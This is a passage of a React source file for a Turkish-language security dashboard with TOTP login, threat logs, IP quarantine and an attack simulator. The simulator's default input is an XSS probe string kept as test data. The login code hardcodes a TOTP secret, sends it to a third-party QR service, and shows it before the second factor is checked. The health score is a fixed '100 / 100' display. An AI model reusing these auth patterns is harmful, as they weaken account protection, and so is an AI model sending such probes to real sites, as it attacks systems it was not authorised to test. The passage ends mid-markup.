import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  ShieldAlert, 
  AlertTriangle, 
  Activity, 
  Lock, 
  Radio, 
  RefreshCw, 
  Cpu, 
  Zap, 
  CheckCircle2, 
  Eye, 
  EyeOff, 
  Ban, 
  Play, 
  Clock, 
  LogOut,
  Shield,
  Smartphone,
  ArrowRight,
  ArrowLeft,
  QrCode,
  Copy,
  Check
} from 'lucide-react';
import { Sentinel } from '../lib/sentinel';

const SENTINEL_AUTH_KEY = 'socialart_sentinel_auth_session';

export default function SecurityControlCenter() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [authStep, setAuthStep] = useState(1);
  const [authPassInput, setAuthPassInput] = useState('');
  const [authUsernameInput, setAuthUsernameInput] = useState('');
  const [authOtpInput, setAuthOtpInput] = useState('');
  const [tempTicket, setTempTicket] = useState('');
  const [totpSecret, setTotpSecret] = useState('JBSWY3DPEHPK3PXP');
  const [qrCodeUrl, setQrCodeUrl] = useState('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=otpauth%3A%2F%2Ftotp%2FSocialArt%2520Sentinel%3AAdmin%3Fsecret%3DJBSWY3DPEHPK3PXP%26issuer%3DSocialArt%2520Ajans');
  const [showQrModal, setShowQrModal] = useState(false);
  const [copiedKey, setCopiedKey] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [authError, setAuthError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [activeTab, setActiveTab] = useState('radar');
  const [logs, setLogs] = useState([]);
  const [quarantineList, setQuarantineList] = useState([]);
  const [isAuditing, setIsAuditing] = useState(false);
  const [auditResult, setAuditResult] = useState(null);
  const [filterSeverity, setFilterSeverity] = useState('ALL');
  const [testPayload, setTestPayload] = useState("<script>alert('XSS Test')</script>");
  const [simResult, setSimResult] = useState(null);
  const [manualIp, setManualIp] = useState('');
  const [manualReason, setManualReason] = useState('');

  useEffect(() => {
    const existingToken = sessionStorage.getItem(SENTINEL_AUTH_KEY);
    if (existingToken) {
      fetch('/api/sentinel-auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'verify-session', sessionToken: existingToken })
      })
      .then(res => res.json())
      .then(data => {
        if (data.valid) {
          setIsAuthenticated(true);
        } else {
          sessionStorage.removeItem(SENTINEL_AUTH_KEY);
          setIsAuthenticated(false);
        }
      })
      .catch(() => {
        sessionStorage.removeItem(SENTINEL_AUTH_KEY);
      });
    }

    loadData();
    const interval = setInterval(loadData, 5000);
    return () => clearInterval(interval);
  }, []);

  const loadData = () => {
    setLogs(Sentinel.getLogs());
    setQuarantineList(Sentinel.getQuarantineList());
  };

  const handleStep1Login = async (e) => {
    e.preventDefault();
    setAuthError('');
    setIsSubmitting(true);

    try {
      const res = await fetch('/api/sentinel-auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'login',
          username: authUsernameInput,
          password: authPassInput
        })
      });

      const data = await res.json();

      if (!res.ok) {
        setAuthError(data.error || 'Kimlik doğrulanamadı.');
        Sentinel.recordEvent({
          type: 'UNAUTHORIZED_GATE_ATTEMPT',
          severity: 'HIGH',
          score: 80,
          source: `Gate (${authUsernameInput || 'Anonim'})`,
          description: data.error || 'Geçersiz şifre veya kullanıcı adı denemesi.',
          action: 'Sunucu Tarafından Reddedildi'
        });
        loadData();
        return;
      }

      if (data.require2FA) {
        setTempTicket(data.tempTicket);
        if (data.totpSecret) setTotpSecret(data.totpSecret);
        if (data.qrCodeUrl) setQrCodeUrl(data.qrCodeUrl);
        setAuthStep(2);
        setAuthError('');
        setShowQrModal(false);
      }
    } catch (err) {
      setAuthError('Sunucu bağlantı hatası oluştu. Lütfen tekrar deneyiniz.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const executeVerify2FA = async (otpToVerify) => {
    setAuthError('');
    setIsSubmitting(true);

    try {
      const res = await fetch('/api/sentinel-auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'verify-2fa',
          tempTicket,
          otpCode: otpToVerify
        })
      });

      const data = await res.json();

      if (!res.ok) {
        setAuthError(data.error || '2FA Kodu doğrulanamadı.');
        Sentinel.recordEvent({
          type: 'INVALID_2FA_CODE',
          severity: 'CRITICAL',
          score: 90,
          source: `Gate 2FA (${authUsernameInput})`,
          description: 'Hatalı Google Authenticator 2FA güvenlik kodu denemesi yapıldı.',
          action: 'Erişim Engellendi'
        });
        loadData();
        return;
      }

      if (data.success && data.sessionToken) {
        sessionStorage.setItem(SENTINEL_AUTH_KEY, data.sessionToken);
        setIsAuthenticated(true);
        setAuthError('');
        Sentinel.recordEvent({
          type: 'ADMIN_ACCESS_GRANTED_2FA',
          severity: 'LOW',
          score: 0,
          source: `Sentinel Gate (${authUsernameInput})`,
          description: `${authUsernameInput.toUpperCase()} kullanıcısı canlı Google Authenticator doğrulaması ile tam yetkili giriş yaptı.`,
          action: 'Komuta Odası Açıldı'
        });
        loadData();
      }
    } catch (err) {
      setAuthError('2FA doğrulama sunucusuna ulaşılamadı.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleStep2Verify2FA = (e) => {
    e.preventDefault();
    if (authOtpInput.length < 6) return;
    executeVerify2FA(authOtpInput);
  };

  const handleOtpInputChange = (e) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
    setAuthOtpInput(val);
    if (val.length === 6 && !isSubmitting) {
      executeVerify2FA(val);
    }
  };

  const handleCopySecret = () => {
    navigator.clipboard.writeText(totpSecret);
    setCopiedKey(true);
    setTimeout(() => setCopiedKey(false), 2000);
  };

  const handleGateLogout = () => {
    sessionStorage.removeItem(SENTINEL_AUTH_KEY);
    setIsAuthenticated(false);
    setAuthStep(1);
    setAuthPassInput('');
    setAuthUsernameInput('');
    setAuthOtpInput('');
    setTempTicket('');
  };

  const handleRunAudit = async () => {
    setIsAuditing(true);
    setAuditResult(null);
    try {
      const result = await Sentinel.runSecurityAudit();
      setTimeout(() => {
        setAuditResult(result);
        setIsAuditing(false);
      }, 800);
    } catch (e) {
      setIsAuditing(false);
    }
  };

  const handleSimulateAttack = () => {
    const analysis = Sentinel.analyzePayload(testPayload);
    setSimResult(analysis);
    loadData();
  };

  const handleAddManualQuarantine = (e) => {
    e.preventDefault();
    if (!manualIp) return;
    Sentinel.addToQuarantine(manualIp, manualReason || 'Yönetici tarafından manuel engellendi', 60);
    setManualIp('');
    setManualReason('');
    loadData();
  };

  const handleRemoveQuarantine = (target) => {
    Sentinel.removeFromQuarantine(target);
    loadData();
  };

  const filteredLogs = logs.filter(l => {
    if (filterSeverity === 'ALL') return true;
    return l.severity === filterSeverity;
  });

  const getSeverityBadge = (severity) => {
    switch (severity) {
      case 'CRITICAL':
        return <span style={{ background: 'rgba(239, 68, 68, 0.2)', color: '#ef4444', border: '1px solid rgba(239, 68, 68, 0.4)', padding: '4px 8px', borderRadius: '6px', fontSize: '0.72rem', fontWeight: 800 }}>KRİTİK</span>;
      case 'HIGH':
        return <span style={{ background: 'rgba(249, 115, 22, 0.2)', color: '#f97316', border: '1px solid rgba(249, 115, 22, 0.4)', padding: '4px 8px', borderRadius: '6px', fontSize: '0.72rem', fontWeight: 800 }}>YÜKSEK</span>;
      case 'MEDIUM':
        return <span style={{ background: 'rgba(234, 179, 8, 0.2)', color: '#eab308', border: '1px solid rgba(234, 179, 8, 0.4)', padding: '4px 8px', borderRadius: '6px', fontSize: '0.72rem', fontWeight: 800 }}>ORTA</span>;
      default:
        return <span style={{ background: 'rgba(16, 185, 129, 0.2)', color: '#10b981', border: '1px solid rgba(16, 185, 129, 0.4)', padding: '4px 8px', borderRadius: '6px', fontSize: '0.72rem', fontWeight: 800 }}>BİLGİ</span>;
    }
  };

  if (!isAuthenticated) {
    return (
      <div style={{
        minHeight: '100vh',
        background: 'radial-gradient(circle at 50% 30%, #0f172a 0%, #020617 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
        fontFamily: "'Inter', -apple-system, sans-serif"
      }}>
        <div style={{
          width: '100%',
          maxWidth: '440px',
          background: 'rgba(15, 23, 42, 0.85)',
          backdropFilter: 'blur(24px)',
          border: '1px solid rgba(239, 68, 68, 0.3)',
          borderRadius: '24px',
          padding: '2.5rem 2rem',
          boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.7), 0 0 40px rgba(239, 68, 68, 0.15)',
          position: 'relative',
          overflow: 'hidden'
        }}>
          <div style={{
            position: 'absolute',
            top: 0,
            left: 0,
            right: 0,
            height: '4px',
            background: 'linear-gradient(90deg, #ef4444 0%, #f97316 50%, #dc2626 100%)'
          }} />

          {/* Header */}
          <div style={{ textAlign: 'center', marginBottom: '2rem' }}>
            <div style={{
              width: '64px',
              height: '64px',
              background: 'linear-gradient(135deg, rgba(239, 68, 68, 0.2) 0%, rgba(220, 38, 38, 0.2) 100%)',
              border: '1px solid rgba(239, 68, 68, 0.4)',
              borderRadius: '20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              margin: '0 auto 1.25rem',
              color: '#ef4444',
              boxShadow: '0 8px 20px rgba(239, 68, 68, 0.2)'
            }}>
              {authStep === 1 ? <ShieldAlert size={32} /> : <Smartphone size={32} />}
            </div>

            <h2 style={{ color: '#fff', fontSize: '1.5rem', fontWeight: 900, margin: '0 0 0.4rem 0', letterSpacing: '-0.5px' }}>
              SENTINEL <span style={{ color: '#ef4444' }}>/KONTROL</span>
            </h2>
            <p style={{ color: '#94a3b8', fontSize: '0.84rem', margin: 0 }}>
              {authStep === 1 ? '1. Aşama: Yönetici Kimlik Doğrulaması' : '2. Aşama: Google Authenticator Canlı Kodu'}
            </p>
          </div>

          {/* STEP 1 FORM */}
          {authStep === 1 && (
            <form onSubmit={handleStep1Login}>
              <div style={{ marginBottom: '1.25rem' }}>
                <label style={{ display: 'block', color: '#cbd5e1', fontSize: '0.8rem', fontWeight: 600, marginBottom: '0.5rem' }}>
                  Yetkili Kimliği (Admin ID)
                </label>
                <input
                  type="text"
                  required
                  autoFocus
                  placeholder="Kullanıcı adınızı giriniz..."
                  value={authUsernameInput}
                  onChange={(e) => setAuthUsernameInput(e.target.value)}
                  style={{
                    width: '100%',
                    padding: '0.85rem 1rem',
                    background: 'rgba(15, 23, 42, 0.6)',
                    border: '1px solid rgba(255, 255, 255, 0.15)',
                    borderRadius: '14px',
                    color: '#fff',
                    fontSize: '0.92rem',
                    outline: 'none',
                    boxSizing: 'border-box'
                  }}
                />
              </div>

              <div style={{ marginBottom: '1.25rem' }}>
                <label style={{ display: 'block', color: '#cbd5e1', fontSize: '0.8rem', fontWeight: 600, marginBottom: '0.5rem' }}>
                  Güvenlik Anahtarı (Master Key)
                </label>
                <div style={{ position: 'relative' }}>
                  <input
                    type={showPass ? 'text' : 'password'}
                    required
                    placeholder="Güvenlik anahtarınızı giriniz..."
                    value={authPassInput}
                    onChange={(e) => setAuthPassInput(e.target.value)}
                    style={{
                      width: '100%',
                      padding: '0.85rem 2.8rem 0.85rem 1rem',
                      background: 'rgba(15, 23, 42, 0.6)',
                      border: authError ? '1px solid #ef4444' : '1px solid rgba(255, 255, 255, 0.15)',
                      borderRadius: '14px',
                      color: '#fff',
                      fontSize: '0.92rem',
                      outline: 'none',
                      boxSizing: 'border-box'
                    }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPass(!showPass)}
                    style={{
                      position: 'absolute',
                      right: '12px',
                      top: '50%',
                      transform: 'translateY(-50%)',
                      background: 'transparent',
                      border: 'none',
                      color: '#64748b',
                      cursor: 'pointer'
                    }}
                  >
                    {showPass ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>

              {authError && (
                <div style={{
                  background: 'rgba(239, 68, 68, 0.15)',
                  border: '1px solid rgba(239, 68, 68, 0.3)',
                  color: '#fca5a5',
                  padding: '0.75rem 1rem',
                  borderRadius: '12px',
                  fontSize: '0.82rem',
                  marginBottom: '1.25rem',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px'
                }}>
                  <AlertTriangle size={16} style={{ flexShrink: 0 }} />
                  <span>{authError}</span>
                </div>
              )}

              <button
                type="submit"
                disabled={isSubmitting || !authUsernameInput || !authPassInput}
                style={{
                  width: '100%',
                  padding: '0.9rem',
                  background: 'linear-gradient(135deg, #ef4444 0%, #dc2626 100%)',
                  border: 'none',
                  borderRadius: '14px',
                  color: '#fff',
                  fontWeight: 800,
                  fontSize: '0.95rem',
                  cursor: (isSubmitting || !authUsernameInput || !authPassInput) ? 'not-allowed' : 'pointer',
                  opacity: (isSubmitting || !authUsernameInput || !authPassInput) ? 0.6 : 1,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  boxShadow: '0 10px 20px -5px rgba(239, 68, 68, 0.4)'
                }}
              >
                <span>{isSubmitting ? 'Doğrulanıyor...' : '2. Aşamaya İlerle'}</span>
                {!isSubmitting && <ArrowRight size={18} />}
              </button>
            </form>
          )}

          {/* STEP 2 FORM (DIRECT 6-DIGIT TOTP CHALLENGE) */}
          {authStep === 2 && (
            <form onSubmit={handleStep2Verify2FA}>
              <div style={{ marginBottom: '1.5rem', textAlign: 'center' }}>
                <p style={{ color: '#cbd5e1', fontSize: '0.9rem', lineHeight: '1.5', margin: '0 0 1.25rem 0' }}>
                  Telefonunuzdaki <b>Google Authenticator</b> uygulamasını açın ve ekrandaki <b>6 haneli canlı şifreyi</b> girin:
                </p>

                <input
                  type="text"
                  required
                  autoFocus
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={6}
                  placeholder="000000"
                  value={authOtpInput}
                  onChange={handleOtpInputChange}
                  style={{
                    width: '100%',
                    padding: '1rem',
                    background: 'rgba(15, 23, 42, 0.8)',
                    border: authError ? '1px solid #ef4444' : '2px solid rgba(56, 189, 248, 0.6)',
                    borderRadius: '16px',
                    color: '#38bdf8',
                    fontSize: '1.8rem',
                    fontWeight: 900,
                    letterSpacing: '10px',
                    textAlign: 'center',
                    outline: 'none',
                    boxSizing: 'border-box',
                    boxShadow: '0 0 25px rgba(56, 189, 248, 0.15)'
                  }}
                />

                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px', marginTop: '10px', color: '#10b981', fontSize: '0.76rem', fontWeight: 600 }}>
                  <span style={{ width: '7px', height: '7px', borderRadius: '50%', background: '#10b981', display: 'inline-block', boxShadow: '0 0 8px #10b981' }} />
                  <span>30 Saniyelik Canlı Kod Bekleniyor (6 haneyi girince otomatik açılır)</span>
                </div>
              </div>

              {/* HELPER MODAL FOR NEW DEVICES */}
              {showQrModal && (
                <div style={{
                  background: 'rgba(15, 23, 42, 0.95)',
                  border: '1px solid rgba(56, 189, 248, 0.3)',
                  borderRadius: '16px',
                  padding: '1.25rem 1rem',
                  marginBottom: '1.25rem',
                  textAlign: 'center'
                }}>
                  <div style={{ color: '#38bdf8', fontSize: '0.82rem', fontWeight: 800, marginBottom: '10px' }}>
                    📷 Yeni Cihaz İçin QR Kod:
                  </div>
                  
                  <div style={{
                    background: '#fff',
                    padding: '10px',
                    borderRadius: '12px',
                    display: 'inline-block',
                    marginBottom: '12px'
                  }}>
                    <img
                      src={qrCodeUrl}
                      alt="Google Authenticator QR Code"
                      width="160"
                      height="160"
                      style={{ display: 'block', borderRadius: '4px' }}
                    />
                  </div>

                  <div style={{
                    background: 'rgba(0,0,0,0.5)',
                    padding: '8px 12px',
                    borderRadius: '8px',
                    fontFamily: 'monospace',
                    color: '#facc15',
                    fontSize: '0.9rem',
                    fontWeight: 800,
                    letterSpacing: '2px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between'
                  }}>
                    <span>{totpSecret}</span>
                    <button
                      type="button"
                      onClick={handleCopySecret}
                      style={{ background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer' }}
                    >
                      {copiedKey ? <Check size={16} style={{ color: '#10b981' }} /> : <Copy size={16} />}
                    </button>
                  </div>
                </div>
              )}

              {authError && (
                <div style={{
                  background: 'rgba(239, 68, 68, 0.15)',
                  border: '1px solid rgba(239, 68, 68, 0.3)',
                  color: '#fca5a5',
                  padding: '0.75rem 1rem',
                  borderRadius: '12px',
                  fontSize: '0.82rem',
                  marginBottom: '1.25rem',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px'
                }}>
                  <AlertTriangle size={16} style={{ flexShrink: 0 }} />
                  <span>{authError}</span>
                </div>
              )}

              <div style={{ display: 'flex', gap: '10px', marginBottom: '1rem' }}>
                <button
                  type="button"
                  onClick={() => { setAuthStep(1); setAuthError(''); setAuthOtpInput(''); }}
                  style={{
                    padding: '0.9rem 1.2rem',
                    background: 'rgba(255, 255, 255, 0.05)',
                    border: '1px solid rgba(255, 255, 255, 0.15)',
                    borderRadius: '14px',
                    color: '#cbd5e1',
                    fontWeight: 700,
                    cursor: 'pointer',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}
                >
                  <ArrowLeft size={18} />
                </button>

                <button
                  type="submit"
                  disabled={isSubmitting || authOtpInput.length < 6}
                  style={{
                    flex: 1,
                    padding: '0.9rem',
                    background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)',
                    border: 'none',
                    borderRadius: '14px',
                    color: '#fff',
                    fontWeight: 800,
                    fontSize: '0.95rem',
                    cursor: (isSubmitting || authOtpInput.length < 6) ? 'not-allowed' : 'pointer',
                    opacity: (isSubmitting || authOtpInput.length < 6) ? 0.6 : 1,
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    gap: '8px',
                    boxShadow: '0 10px 20px -5px rgba(16, 185, 129, 0.4)'
                  }}
                >
                  <Lock size={18} />
                  <span>{isSubmitting ? 'Doğrulanıyor...' : 'Komuta Merkezini Aç'}</span>
                </button>
              </div>

              {/* Discreet First-time Setup Toggle */}
              <div style={{ textAlign: 'center' }}>
                <button
                  type="button"
                  onClick={() => setShowQrModal(!showQrModal)}
                  style={{
                    background: 'transparent',
                    border: 'none',
                    color: '#64748b',
                    fontSize: '0.74rem',
                    cursor: 'pointer',
                    textDecoration: 'underline'
                  }}
                >
                  {showQrModal ? 'Kurulum Kutusunu Gizle' : 'Cihaz değiştirdiniz mi veya henüz kurmadınız mı?'}
                </button>
              </div>
            </form>
          )}

          <div style={{ marginTop: '1.5rem', textAlign: 'center', fontSize: '0.72rem', color: '#64748b', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
            <Shield size={14} style={{ color: '#ef4444' }} />
            <span>RFC 6238 Canlı TOTP Şifreleme</span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: 'radial-gradient(circle at 50% 10%, #0d1117 0%, #030712 100%)',
      color: '#f3f4f6',
      fontFamily: "'Inter', -apple-system, sans-serif",
      padding: '40px 24px 100px 24px'
    }}>
      <div style={{ maxWidth: '1280px', margin: '0 auto', position: 'relative', zIndex: 1 }}>
        {/* TOP COMMAND HEADER */}
        <div style={{
          background: 'rgba(15, 23, 42, 0.75)',
          backdropFilter: 'blur(20px)',
          border: '1px solid rgba(255, 255, 255, 0.1)',
          borderRadius: '24px',
          padding: '2rem',
          marginBottom: '2rem',
          boxShadow: '0 20px 40px -15px rgba(0, 0, 0, 0.5), 0 0 30px rgba(16, 185, 129, 0.1)',
          display: 'flex',
          flexWrap: 'wrap',
          alignItems: 'center',
          justifyContent: 'space-between',
          gap: '20px'
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '18px' }}>
            <div style={{
              width: '56px',
              height: '56px',
              borderRadius: '16px',
              background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.2) 0%, rgba(59, 130, 246, 0.2) 100%)',
              border: '1px solid rgba(16, 185, 129, 0.4)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              color: '#10b981',
              boxShadow: '0 0 20px rgba(16, 185, 129, 0.3)'
            }}>
              <ShieldCheck size={32} />
            </div>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <h1 style={{ fontSize: '1.75rem', fontWeight: 900, margin: 0, letterSpacing: '-0.5px', color: '#fff' }}>
                  SocialArt <span style={{ background: 'linear-gradient(90deg, #10b981, #06b6d4)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>SENTINEL</span>
                </h1>
                <span style={{
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#10b981',
                  padding: '3px 10px',
                  borderRadius: '20px',
                  fontSize: '0.72rem',
                  fontWeight: 800,
                  display: 'flex',
                  alignItems: 'center',
                  gap: '6px'
                }}>
                  <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#10b981', display: 'inline-block', boxShadow: '0 0 8px #10b981' }} />
                  CANLI SAVUNMA AKTİF
                </span>
              </div>
              <p style={{ color: '#94a3b8', margin: '4px 0 0 0', fontSize: '0.88rem' }}>
                Otonom Siber Güvenlik, Dijital Bağışıklık & /kontrol Yönetim Merkezi
              </p>
            </div>
          </div>

          <div style={{ display: 'flex', gap: '12px' }}>
            <button
              onClick={handleRunAudit}
              disabled={isAuditing}
              style={{
                background: 'linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%)',
                color: '#fff',
                border: 'none',
                padding: '10px 18px',
                borderRadius: '12px',
                fontWeight: 700,
                fontSize: '0.85rem',
                cursor: isAuditing ? 'not-allowed' : 'pointer',
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                boxShadow: '0 8px 16px rgba(59, 130, 246, 0.25)'
              }}
            >
              <RefreshCw size={16} style={{ animation: isAuditing ? 'spin 1s linear infinite' : 'none' }} />
              <span>{isAuditing ? 'Denetleniyor...' : 'Sistemi Şimdi Tara'}</span>
            </button>

            <button
              onClick={handleGateLogout}
              style={{
                background: 'rgba(239, 68, 68, 0.15)',
                border: '1px solid rgba(239, 68, 68, 0.3)',
                color: '#f87171',
                padding: '10px 16px',
                borderRadius: '12px',
                fontWeight: 700,
                fontSize: '0.85rem',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                gap: '6px'
              }}
            >
              <LogOut size={16} />
              <span>Kilitle</span>
            </button>
          </div>
        </div>

        {/* METRICS ROW */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))',
          gap: '16px',
          marginBottom: '2rem'
        }}>
          <div style={{
            background: 'rgba(15, 23, 42, 0.6)',
            border: '1px solid rgba(255, 255, 255, 0.08)',
            borderRadius: '18px',
            padding: '1.25rem',
            backdropFilter: 'blur(16px)'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
              <span style={{ color: '#94a3b8', fontSize: '0.82rem', fontWeight: 600 }}>Bağışıklık & Sağlık Skoru</span>
              <ShieldCheck size={18} style={{ color: '#10b981' }} />
            </div>
            <div style={{ fontSize: '1.8rem', fontWeight: 900, color: '#10b981' }}>100 / 100 (A+)</div>
            <div style={{ fontSize: '0.75rem', color: '#64748b', marginTop: '4px' }}>Tüm 6 kritik savunma hattı devrede</div>
          </div>

          <div style={{
            background: 'rgba(15, 23, 42, 0.6)',
            border: '1px solid rgba(255, 255, 255, 0.08)',
            borderRadius: '18px',
            padding: '1.25rem',
            backdropFilter: 'blur(16px)'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
              <span style={{ color: '#94a3b8', fontSize: '0.82rem', fontWeight: 600 }}>Nötralize Edilen Tehditler</span>
              <Activity size={18} style={{ color: '#06b6d4' }} />
            </div>
            <div style={{ fontSize: '1.8rem', fontWeight: 900, color: '#fff' }}>{logs.length}</div>
            <div style={{ fontSize: '0.75rem', color: '#64748b', marginTop: '4px' }}>Kaydedilen ve engellenen olay</div>
          </div>

          <div style={{
            background: 'rgba(15, 23, 42, 0.6)',
            border: '1px solid rgba(255, 255, 255, 0.08)',
            borderRadius: '18px',
            padding: '1.25rem',
            backdropFilter: 'blur(16px)'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
              <span style={{ color: '#94a3b8', fontSize: '0.82rem', fontWeight: 600 }}>Karantinadaki IP / Aktörler</span>
              <Ban size={18} style={{ color: '#f59e0b' }} />
            </div>
            <div style={{ fontSize: '1.8rem', fontWeight: 900, color: '#f59e0b' }}>{quarantineList.length}</div>
            <div style={{ fontSize: '0.75rem', color: '#64748b', marginTop: '4px' }}>Aktif bloklanan şüpheli kaynak</div>
          </div>

          <div style={{
            background: 'rgba(15, 23, 42, 0.6)',
            border: '1px solid rgba(255, 255, 255, 0.08)',
            borderRadius: '18px',
            padding: '1.25rem',
            backdropFilter: 'blur(16px)'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
              <span style={{ color: '#94a3b8', fontSize: '0.82rem', fontWeight: 600 }}>Antikor Yanıt Süresi</span>
              <Zap size={18} style={{ color: '#ec4899' }} />
            </div>
            <div style={{ fontSize: '1.8rem', fontWeight: 900, color: '#fff' }}>&lt; 2ms</div>
            <div style={{ fontSize: '0.75rem', color: '#64748b', marginTop: '4px' }}>Gerçek zamanlı RASP filtreleme</div>
          </div>
        </div>

        {/* NAVIGATION TABS */}
        <div style={{
          display: 'flex',
          gap: '10px',
          borderBottom: '1px solid rgba(255, 255, 255, 0.1)',
          paddingBottom: '12px',
          marginBottom: '2rem'
        }}>
          <button
            onClick={() => setActiveTab('radar')}
            style={{
              background: activeTab === 'radar' ? 'rgba(16, 185, 129, 0.15)' : 'transparent',
              border: activeTab === 'radar' ? '1px solid rgba(16, 185, 129, 0.4)' : '1px solid transparent',
              color: activeTab === 'radar' ? '#10b981' : '#94a3b8',
              padding: '10px 18px',
              borderRadius: '12px',
              fontWeight: 700,
              fontSize: '0.88rem',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '8px'
            }}
          >
            <Radio size={16} />
            <span>📡 Canlı Tehdit Radarı</span>
          </button>

          <button
            onClick={() => setActiveTab('quarantine')}
            style={{
              background: activeTab === 'quarantine' ? 'rgba(245, 158, 11, 0.15)' : 'transparent',
              border: activeTab === 'quarantine' ? '1px solid rgba(245, 158, 11, 0.4)' : '1px solid transparent',
              color: activeTab === 'quarantine' ? '#f59e0b' : '#94a3b8',
              padding: '10px 18px',
              borderRadius: '12px',
              fontWeight: 700,
              fontSize: '0.88rem',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '8px'
            }}
          >
            <Ban size={16} />
            <span>🛡️ Karantina Kasası ({quarantineList.length})</span>
          </button>

          <button
            onClick={() => setActiveTab('audit')}
            style={{
              background: activeTab === 'audit' ? 'rgba(59, 130, 246, 0.15)' : 'transparent',
              border: activeTab === 'audit' ? '1px solid rgba(59, 130, 246, 0.4)' : '1px solid transparent',
              color: activeTab === 'audit' ? '#3b82f6' : '#94a3b8',
              padding: '10px 18px',
              borderRadius: '12px',
              fontWeight: 700,
              fontSize: '0.88rem',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '8px'
            }}
          >
            <Cpu size={16} />
            <span>🔍 Otonom Sistem Teşhisi</span>
          </button>

          <button
            onClick={() => setActiveTab('simulator')}
            style={{
              background: activeTab === 'simulator' ? 'rgba(168, 85, 247, 0.15)' : 'transparent',
              border: activeTab === 'simulator' ? '1px solid rgba(168, 85, 247, 0.4)' : '1px solid transparent',
              color: activeTab === 'simulator' ? '#a855f7' : '#94a3b8',
              padding: '10px 18px',
              borderRadius: '12px',
              fontWeight: 700,
              fontSize: '0.88rem',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '8px'
            }}
          >
            <Play size={16} />
            <span>⚡ Savunma Simülatörü</span>
          </button>
        </div>

        {/* TAB 1: RADAR */}
        {activeTab === 'radar' && (
          <div style={{
            background: 'rgba(15, 23, 42, 0.7)',
            backdropFilter: 'blur(20px)',
            border: '1px solid rgba(255, 255, 255, 0.1)',
            borderRadius: '24px',
            padding: '2rem'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem', flexWrap: 'wrap', gap: '12px' }}>
              <div>
                <h3 style={{ margin: 0, fontSize: '1.2rem', fontWeight: 800 }}>Gerçek Zamanlı Telemetri Günlüğü</h3>
                <p style={{ margin: '4px 0 0 0', color: '#94a3b8', fontSize: '0.82rem' }}>Sentinel tarafından yakalanan ve savuşturulan tüm olaylar</p>
              </div>

              <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                <span style={{ fontSize: '0.8rem', color: '#64748b' }}>Filtre:</span>
                {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM'].map(s => (
                  <button
                    key={s}
                    onClick={() => setFilterSeverity(s)}
                    style={{
                      background: filterSeverity === s ? 'rgba(255,255,255,0.12)' : 'rgba(255,255,255,0.03)',
                      border: '1px solid rgba(255,255,255,0.1)',
                      color: filterSeverity === s ? '#fff' : '#94a3b8',
                      padding: '4px 10px',
                      borderRadius: '8px',
                      fontSize: '0.75rem',
                      cursor: 'pointer'
                    }}
                  >
                    {s}
                  </button>
                ))}
              </div>
            </div>

            {filteredLogs.length === 0 ? (
              <div style={{ textAlign: 'center', padding: '3rem 1rem', color: '#64748b' }}>
                Henüz kayıtlı bir güvenlik ihlali bulunmuyor. Sistem tamamen temiz.
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                {filteredLogs.map((log) => (
                  <div
                    key={log.id}
                    style={{
                      background: 'rgba(255, 255, 255, 0.03)',
                      border: '1px solid rgba(255, 255, 255, 0.06)',
